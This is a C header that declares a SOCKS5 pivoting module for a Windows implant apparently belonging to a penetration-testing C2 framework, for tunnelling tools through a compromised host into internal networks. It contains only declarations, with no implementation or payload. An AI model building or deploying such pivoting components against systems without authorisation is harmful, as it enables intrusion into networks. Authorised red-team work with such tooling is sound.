/*
 * socks_proxy.h — In-agent SOCKS5 proxy for network pivoting.
 *
 * Enables the pentester to route tools (Nmap, CrackMapExec, Impacket,
 * Burp Suite, proxychains) through the compromised host to reach
 * internal networks that aren't directly accessible.
 *
 * Architecture:
 *   Operator runs a local SOCKS5 listener (Python side).
 *   Client tools connect to the local listener.
 *   SOCKS5 CONNECT requests are forwarded to the agent via C2.
 *   The agent opens the actual TCP connection to the target.
 *   Data flows bidirectionally: client ↔ operator ↔ C2 ↔ agent ↔ target.
 *
 * Supports:
 *   - SOCKS5 CONNECT (TCP) — RFC 1928
 *   - IPv4 and domain name address types
 *   - No authentication (auth handled at operator level)
 *   - Multiple concurrent connections
 *
 * Does NOT support:
 *   - SOCKS5 BIND (not needed for pentesting pivots)
 *   - SOCKS5 UDP ASSOCIATE (not tunneled through C2)
 *   - SOCKS4/4a (use SOCKS5)
 */
#ifndef SOCKS_PROXY_H
#define SOCKS_PROXY_H

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

/* ─── Connection states ─── */
typedef enum _SOCKS_CONN_STATE {
    SOCKS_STATE_IDLE       = 0,
    SOCKS_STATE_CONNECTING = 1,
    SOCKS_STATE_CONNECTED  = 2,
    SOCKS_STATE_ERROR      = 3,
    SOCKS_STATE_CLOSED     = 4,
} SOCKS_CONN_STATE;

/* ─── Single proxied connection ─── */
typedef struct _SOCKS_CONNECTION {
    DWORD              connId;        /* Unique ID assigned by operator */
    SOCKET             sock;          /* Local socket to target */
    SOCKS_CONN_STATE   state;
    char               targetHost[256];
    USHORT             targetPort;
    DWORD              lastActivity;  /* GetTickCount64 timestamp */

    /* Receive buffer for data from target → agent → operator */
    unsigned char     *recvBuf;
    DWORD              recvLen;
    DWORD              recvCap;
} SOCKS_CONNECTION;

/* ─── Proxy manager ─── */
#define SOCKS_MAX_CONNECTIONS 64
#define SOCKS_RECV_BUF_SIZE  65536
#define SOCKS_IDLE_TIMEOUT   300000  /* 5 minutes idle = close */

typedef struct _SOCKS_PROXY {
    SOCKS_CONNECTION   conns[SOCKS_MAX_CONNECTIONS];
    int                connCount;
    BOOL               running;
    CRITICAL_SECTION   lock;
    HANDLE             hPollThread;   /* Background thread for recv polling */
} SOCKS_PROXY;

/*
 * Initialize the SOCKS proxy subsystem.
 * Must be called once during agent init.
 * Initializes Winsock (WSAStartup) if not already done.
 */
BOOL socks_init(SOCKS_PROXY *proxy);

/*
 * Shut down the SOCKS proxy. Closes all connections.
 */
void socks_shutdown(SOCKS_PROXY *proxy);

/*
 * Handle a SOCKS_CONNECT request from the operator.
 * Opens a TCP connection to targetHost:targetPort.
 *
 * connId: unique connection ID (assigned by operator, used for routing)
 * targetHost: destination IP or hostname
 * targetPort: destination port
 *
 * Returns TRUE if connection initiated (may still be connecting async).
 */
BOOL socks_connect(SOCKS_PROXY *proxy, DWORD connId,
                   const char *targetHost, USHORT targetPort);

/*
 * Send data from operator to target (through the proxied connection).
 * Called when the agent receives SOCKS_DATA_CHUNK from C2.
 */
BOOL socks_send_data(SOCKS_PROXY *proxy, DWORD connId,
                     const unsigned char *data, DWORD dataLen);

/*
 * Close a proxied connection.
 * Called when operator sends SOCKS_CLOSE.
 */
void socks_close_connection(SOCKS_PROXY *proxy, DWORD connId);

/*
 * Poll all active connections for incoming data from targets.
 * Returns data that needs to be sent back to the operator.
 *
 * outBuf: caller-allocated buffer to receive TLV-encoded results
 * outBufSize: size of outBuf
 * bytesWritten: actual bytes written
 *
 * Data format per connection with data:
 *   TLV(SOCKS_CONN_ID, 4 bytes) + TLV(SOCKS_DATA_CHUNK, data)
 *
 * Returns number of connections that had data.
 */
int socks_poll(SOCKS_PROXY *proxy, unsigned char *outBuf,
               DWORD outBufSize, DWORD *bytesWritten);

/*
 * Get connection statistics for the operator's info display.
 */
typedef struct _SOCKS_STATS {
    int activeConnections;
    int totalConnections;
    ULONGLONG bytesRelayed;
} SOCKS_STATS;

void socks_get_stats(SOCKS_PROXY *proxy, SOCKS_STATS *stats);

#endif /* SOCKS_PROXY_H */
